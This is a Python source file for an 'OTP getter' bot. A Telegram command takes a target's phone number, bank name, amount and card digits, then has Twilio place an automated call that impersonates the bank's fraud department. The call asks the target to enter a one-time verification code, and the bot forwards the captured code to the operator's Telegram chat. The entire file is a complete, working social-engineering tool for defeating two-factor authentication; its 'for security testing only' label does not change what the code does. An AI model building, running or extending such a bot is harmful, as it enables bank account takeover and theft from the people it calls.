import os
import requests
from flask import Flask, request
from twilio.twiml.voice_response import VoiceResponse, Gather
from twilio.rest import Client
from telegram import Update
from telegram.ext import Application, CommandHandler, ConversationHandler, MessageHandler, filters, ContextTypes

# ==================== CONFIGURATION ====================
TELEGRAM_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
TWILIO_SID = os.environ.get('TWILIO_ACCOUNT_SID')
TWILIO_AUTH = os.environ.get('TWILIO_AUTH_TOKEN')
TWILIO_FROM = os.environ.get('TWILIO_FROM_NUMBER')
BASE_URL = os.environ.get('RENDER_URL', 'https://otp-getter.onrender.com')

# Conversation states (4 steps)
PHONE, BANK, AMOUNT, CARD_LAST4 = range(4)

app = Flask(__name__)

# ==================== FLASK VOICE WEBHOOK ====================
@app.route("/voice", methods=['GET', 'POST'])
def voice():
    response = VoiceResponse()
    
    # If Twilio sent us digits (OTP captured)
    if 'Digits' in request.values:
        digits = request.values['Digits']
        chat_id = request.args.get('chat_id')
        
        print(f"[!] OTP CAPTURED: {digits}")
        
        if chat_id:
            send_telegram_message(chat_id, f"✅ OTP captured: {digits}")
        
        response.say("Thank you. This code has been received. Goodbye.")
        response.hangup()
        return str(response)
    
    # Get parameters for the voice script
    bank_name = request.args.get('bank', 'your bank')
    amount = request.args.get('amount', '500')
    card_last4 = request.args.get('card_last4', '1234')
    
    # Build realistic voice script
    gather = Gather(num_digits=6, action='/voice', method='POST', timeout=10)
    gather.say(f"Hello. This is an automated security call from {bank_name}.")
    gather.say(f"We detected an unusual transaction of {amount} dollars from your account.")
    gather.say(f"The transaction was attempted using card ending in {card_last4}.")
    gather.say("A verification code has been sent to your phone.")
    gather.say("Please enter the 6-digit code to cancel this transaction.")
    gather.say("If you did not authorize this, enter the code immediately.")
    response.append(gather)
    
    response.say("No input received. Goodbye.")
    response.hangup()
    return str(response)

@app.route("/")
def index():
    return "Twilio Voice OTP Bot is running."

def send_telegram_message(chat_id, text):
    """Send message to Telegram user"""
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    try:
        requests.post(url, json={'chat_id': chat_id, 'text': text}, timeout=5)
    except Exception as e:
        print(f"Telegram error: {e}")

def make_twilio_call(to_number, bank_name, amount, card_last4, chat_id):
    """Initiate outbound call via Twilio"""
    client = Client(TWILIO_SID, TWILIO_AUTH)
    voice_url = f"{BASE_URL}/voice?bank={bank_name}&amount={amount}&card_last4={card_last4}&chat_id={chat_id}"
    
    call = client.calls.create(
        to=to_number,
        from_=TWILIO_FROM,
        url=voice_url,
        method='POST'
    )
    return call.sid

# ==================== TELEGRAM BOT HANDLERS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🔐 *OTP Testing Bot*\n\n"
        "Send /call to start a new test call.\n\n"
        "You will be asked for:\n"
        "1️⃣ Phone number (with country code)\n"
        "2️⃣ Bank name\n"
        "3️⃣ Transaction amount\n"
        "4️⃣ Last 4 digits of card\n\n"
        "*For security testing only.*",
        parse_mode='Markdown'
    )

async def call_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📞 Send the phone number to call (with country code, e.g., +447123456789)")
    return PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['phone'] = update.message.text.strip()
    await update.message.reply_text("🏦 Send the bank name (e.g., Chase, Santander, Barclays)")
    return BANK

async def get_bank(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['bank'] = update.message.text.strip()
    await update.message.reply_text("💰 Send the transaction amount (e.g., 1299.99)")
    return AMOUNT

async def get_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['amount'] = update.message.text.strip()
    await update.message.reply_text("💳 Send the last 4 digits of the card number")
    return CARD_LAST4

async def get_card_last4(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['card_last4'] = update.message.text.strip()
    
    phone = context.user_data['phone']
    bank = context.user_data['bank']
    amount = context.user_data['amount']
    card_last4 = context.user_data['card_last4']
    chat_id = update.effective_chat.id
    
    await update.message.reply_text(
        f"📞 Calling {phone}...\n\n"
        f"🏦 Bank: {bank}\n"
        f"💰 Amount: ${amount}\n"
        f"💳 Card ending: {card_last4}\n\n"
        f"⏳ Waiting for person to enter OTP..."
    )
    
    try:
        call_sid = make_twilio_call(phone, bank, amount, card_last4, chat_id)
        await update.message.reply_text(f"✅ Call initiated! Call SID: `{call_sid}`", parse_mode='Markdown')
    except Exception as e:
        await update.message.reply_text(f"❌ Call failed: {str(e)}")
    
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Cancelled.")
    return ConversationHandler.END

# ==================== RUN BOT ====================
def run_telegram():
    app_bot = Application.builder().token(TELEGRAM_TOKEN).build()
    
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('call', call_command)],
        states={
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
            BANK: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_bank)],
            AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_amount)],
            CARD_LAST4: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_card_last4)],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
    )
    
    app_bot.add_handler(CommandHandler('start', start))
    app_bot.add_handler(conv_handler)
    
    print("🤖 Telegram bot is polling...")
    app_bot.run_polling()

if __name__ == "__main__":
    import threading
    # Run Flask in background thread
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)).start()
    # Run Telegram bot
    run_telegram()
